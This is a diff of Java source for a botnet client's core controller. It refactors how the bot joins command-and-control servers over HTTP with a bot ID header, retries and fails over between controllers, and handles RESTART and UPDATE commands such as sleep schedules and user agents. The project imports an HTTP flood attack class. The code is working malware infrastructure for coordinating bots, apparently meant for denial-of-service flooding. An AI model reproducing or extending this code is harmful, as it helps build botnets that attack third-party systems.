@@ -34,6 +34,7 @@ import com.acmutv.botnet.core.analysis.NetworkAnalyzer;
 import com.acmutv.botnet.core.analysis.SystemAnalyzer;
 import com.acmutv.botnet.core.attack.flooding.HttpFloodAttack;
 import com.acmutv.botnet.core.control.Controller;
+import com.acmutv.botnet.core.control.ControllerProperties;
 import com.acmutv.botnet.core.control.ControllerService;
 import com.acmutv.botnet.core.control.command.BotCommand;
 import com.acmutv.botnet.core.control.command.BotCommandService;
@@ -135,7 +136,7 @@ public class CoreController {
           LOGGER.trace("[JOIN Branch]");
           try {
             joinBotnet();
-          } catch (BotInitializationException exc) {
+          } catch (BotnetJoinException | BotInitializationException exc) {
             throw new BotFatalException("Cannot join botnet. %s", exc.getMessage());
           }
           break;
@@ -224,59 +225,110 @@ public class CoreController {
   }
 
   /**
+   * Checks if {@code controller} is a valid controller.
+   * @param controller the controller to check.
+   * @return true if {@code controller} is a valid controller; false, otherwise.
+   */
+  private static boolean checkController(Controller controller) {
+    final String initResource = controller.getInitResource();
+    final String cmdResource = controller.getCmdResource();
+    final String logResource = controller.getLogResource();
+
+    int initType = (HttpManager.isHttpUrl(initResource)) ?
+        1 : (IOManager.isReadableResource(initResource)) ? 2 : -1;
+    int cmdType = (HttpManager.isHttpUrl(cmdResource)) ?
+        1 : (IOManager.isWritableResource(cmdResource)) ? 2 : -1;
+    int logType = (HttpManager.isHttpUrl(logResource)) ?
+        1 : (IOManager.isWritableResource(logResource)) ? 2 : -1;
+
+    boolean sameType = (initType == cmdType && cmdType == logType);
+
+    return sameType && initType > 0 && cmdType > 0 && logType > 0;
+  }
+
+  /**
+   * Join the botnet connecting to the specified {@code controller}.
+   * @param controller the controller to connect to.
+   * @throws ControllerConnectionException if connection cannot be established.
+   * @throws BotInitializationException when bot resources cannot be allocated.
+   */
+  private static void joinBotnetWithController(Controller controller) throws ControllerConnectionException, BotInitializationException {
+    if (controller == null) {
+      throw new ControllerConnectionException("No controller specified.");
+    }
+
+    if (!checkController(controller)) {
+      throw new ControllerConnectionException("Not a valid controller. %s.", controller);
+    }
+
+    final String initResource = controller.getInitResource();
+    LOGGER.info("Contacting C&C at {}...", initResource);
+
+    long failures = 0;
+
+    InputStream in = null;
+
+    try {
+      if (HttpManager.isHttpUrl(initResource)) {
+        HttpMethod method = HttpMethod.GET;
+        URL url = new URL(initResource);
+        HttpProxy proxy = controller.getProxy();
+        Map<String,String> header = controller.getAuthentication(new HashMap<>());
+        header.put("bid", ID);
+        in = HttpManager.getResponseBody(method, url, proxy, header, null);
+      } else {
+        in = IOManager.getInputStream(initResource);
+      }
+      ControllerProperties controllerProps = ControllerService.from(ControllerPropertiesFormat.JSON, in);
+      controller.getAuthentication().putAll(controllerProps.getAuthentication());
+    } catch (IOException exc) {
+      failures++;
+      if (failures <= controller.getReconnections(AppConfigurationService.getConfigurations().getReconnections())) {
+        try {
+          LOGGER.warn("Cannot connect to C&C at {}, waiting for reconnection...", initResource);
+          waitPolling(controller.getReconnectionWait(AppConfigurationService.getConfigurations().getReconnectionWait()).getRandomDuration());
+        } catch (InterruptedException ignored) { /* ignored */}
+      } else {
+        throw new ControllerConnectionException("Maximum number of reconnections reached for C&C at {}", initResource);
+      }
+    } finally {
+      if (in != null) try {
+        in.close();
+      } catch (IOException ignored) { /* ignored */ }
+    }
+
+    CONTROLLER = controller;
+    allocateResources();
+  }
+
+  /**
    * Executes the state {@code JOIN}.
    * Establishes a connection with the controller and make the bot join the botnet.
-   * @throws  BotInitializationException when errors during botnet joining.
+   * @throws  BotnetJoinException when errors during botnet joining.
    */
-  private static void joinBotnet() throws BotInitializationException {
+  private static void joinBotnet() throws BotnetJoinException, BotInitializationException {
     if (AppConfigurationService.getConfigurations().getControllers().isEmpty()) {
-      throw new BotInitializationException("No controller specified.");
+      throw new BotnetJoinException("No controller specified.");
     }
     LOGGER.info("Joining botnet...");
     boolean success = false;
     int controllerId = 0;
     Controller controller = null;
-    long failures = 0;
     while (!success) {
       controller = AppConfigurationService.getConfigurations().getControllers().get(controllerId);
-      final String initResource = controller.getInitResource();
-      LOGGER.info("Loading bot configuration from C&C at {}...", initResource);
       try {
-        InputStream in;
-        if (HttpManager.isHttpUrl(initResource)) {
-          HttpMethod method = HttpMethod.GET;
-          URL url = new URL(initResource);
-          HttpProxy proxy = controller.getProxy();
-          Map<String,String> header = controller.getAuthentication(new HashMap<>());
-          header.put("bid", ID);
-          in = HttpManager.getResponseBody(method, url, proxy, header, null);
-        } else {
-          in = IOManager.getInputStream(initResource);
-        }
-        Map<String,String> furtherAuth = ControllerService.from(ControllerPropertiesFormat.JSON, in);
-        controller.getAuthentication().putAll(furtherAuth);
+        joinBotnetWithController(controller);
         success = true;
-      } catch (IOException exc) {
-        failures++;
-        if (failures <= controller.getReconnections(AppConfigurationService.getConfigurations().getReconnections())) {
-          try {
-            LOGGER.warn("Cannot connect to C&C at {}, waiting for reconnection...", initResource);
-            waitPolling(controller.getReconnectionWait(AppConfigurationService.getConfigurations().getReconnectionWait()).getRandomDuration());
-          } catch (InterruptedException ignored) { }
+      } catch (ControllerConnectionException exc) {
+        LOGGER.warn("Cannot join botnet with C&C at {}. {}", controller.getInitResource(), exc.getMessage());
+        if (controllerId + 1 < AppConfigurationService.getConfigurations().getControllers().size()) {
+          controllerId++;
         } else {
-          LOGGER.warn("Maximum number of reconnections reached for C&C at {}", initResource);
-          if (controllerId + 1 < AppConfigurationService.getConfigurations().getControllers().size()) {
-            controllerId ++;
-            failures = 0;
-          } else {
-            throw new BotInitializationException("Cannot load bot configuration C&C. %s", exc.getMessage());
-          }
+          throw new BotnetJoinException("Cannot join botnet. All C&C are unreachable.");
         }
       }
     }
-    CONTROLLER = controller;
     LOGGER.trace("Botnet joined");
-    allocateResources();
     changeState(BotState.EXECUTION);
     LOGGER.info("Bot is up and running");
   }
@@ -352,12 +404,10 @@ public class CoreController {
 
         break;
 
-
       case RESTART:
-        //TODO review
-        final String resource = (String) cmd.getParams().get("resource");
-        if (resource == null || resource.isEmpty()) {
-          throw new BotMalformedCommandException("Cannot execute command RESTART: param [resource] is null/empty");
+        final Controller controller = (Controller) cmd.getParams().get("controller");
+        if (controller == null) {
+          throw new BotMalformedCommandException("Cannot execute command RESTART: param [controller] is null");
         }
 
         final Boolean restartWait = (Boolean) cmd.getParams().getOrDefault("wait", false);
@@ -367,7 +417,7 @@ public class CoreController {
           delayCommand(restartDelay.getRandomDuration(), CommandScope.RESTART);
         }
 
-        restartBot(resource, restartWait);
+        restartBot(controller, restartWait);
 
         break;
 
@@ -391,7 +441,6 @@ public class CoreController {
         break;
 
       case UPDATE:
-        //TODO review
         @SuppressWarnings("unchecked") final Map<String,String> settings = (Map<String,String>) cmd.getParams().get("settings");
 
         final Interval updateDelay = (Interval) cmd.getParams().get("delay");
@@ -509,24 +558,27 @@ public class CoreController {
 
   /**
    * Executes command {@code RESTART}.
-   * @param resource the path to the CONTROLLERS initialization resource.
+   * @param controller the new controller.
    * @param wait if true, waits for jobs to complete; if false, kills immediately
    * @throws BotExecutionException when command `RESTART` cannot be correctly executed.
    */
-  private static void restartBot(String resource, boolean wait) throws BotExecutionException {
-    //TODO review
-    LOGGER.info("Restarting bot with C&C at {}...", resource);
-    AppConfiguration newConfig;
-    try {
-      newConfig = AppConfigurationService.from(AppConfigurationFormat.JSON, resource);
-    } catch (IOException exc) {
-      throw new BotExecutionException("Cannot restart bot with C&C at %s. %s", resource, exc.getMessage());
-    }
-    freeResources(wait);
-    AppConfigurationService.getConfigurations().copy(newConfig);
-    LOGGER.trace("Bot restarted with configuration {}", AppConfigurationService.getConfigurations());
+  private static void restartBot(Controller controller, boolean wait) throws BotExecutionException {
+    LOGGER.info("Restarting bot configuration with C&C at {}...", controller.getInitResource());
+
     changeState(BotState.JOIN);
-    LOGGER.traceExit();
+
+    Controller oldController = CONTROLLER;
+
+    try {
+      joinBotnetWithController(controller);
+    } catch (ControllerConnectionException exc) {
+      LOGGER.warn("Cannot restart bot with C&C at {}, reloading previous C&C...", controller.getInitResource());
+      CONTROLLER = oldController;
+    } catch (BotInitializationException exc) {
+      exc.printStackTrace();
+    }
+    changeState(BotState.EXECUTION);
+    LOGGER.info("Bot restarted with C&C at {}", CONTROLLER.getInitResource());
   }
 
   /**
@@ -566,18 +618,24 @@ public class CoreController {
   private static void update(Map<String,String> settings) throws BotExecutionException {
     LOGGER.info("Updating settings {}...", settings);
 
-    if (settings.containsKey(Controller.PROPERTY_SLEEP)) {
-      final String sleep = settings.get(Controller.PROPERTY_SLEEP);
-      try {
-        if (sleep == null) {
-          POOL.removeSleepMode();
-        } else {
-          POOL.setSleepMode(new CronExpression(sleep));
+    for (String property : settings.keySet()) {
+      if (property.equals(ControllerProperties.PROPERTY_SLEEP)) {
+        final String sleep = settings.get(ControllerProperties.PROPERTY_SLEEP);
+        try {
+          if (sleep == null) {
+            POOL.removeSleepMode();
+          } else {
+            POOL.setSleepMode(new CronExpression(sleep));
+          }
+        } catch (ParseException | SchedulerException exc) {
+          throw new BotExecutionException("Cannot update [sleep]. %s", exc.getMessage());
         }
-      } catch (ParseException|SchedulerException exc) {
-        throw new BotExecutionException("Cannot update [sleep]. %s", exc.getMessage());
+        AppConfigurationService.getConfigurations().setSleep(sleep);
+      } else if (settings.equals(ControllerProperties.USER_AGENT)){
+        CONTROLLER.getAuthentication().put(ControllerProperties.USER_AGENT, settings.get(property));
+      } else {
+        LOGGER.warn("Cannot update [{}], skipping. This version does not provide the update procedure.", property);
       }
-      AppConfigurationService.getConfigurations().setSleep(sleep);
     }
 
     LOGGER.info("Settings updated");
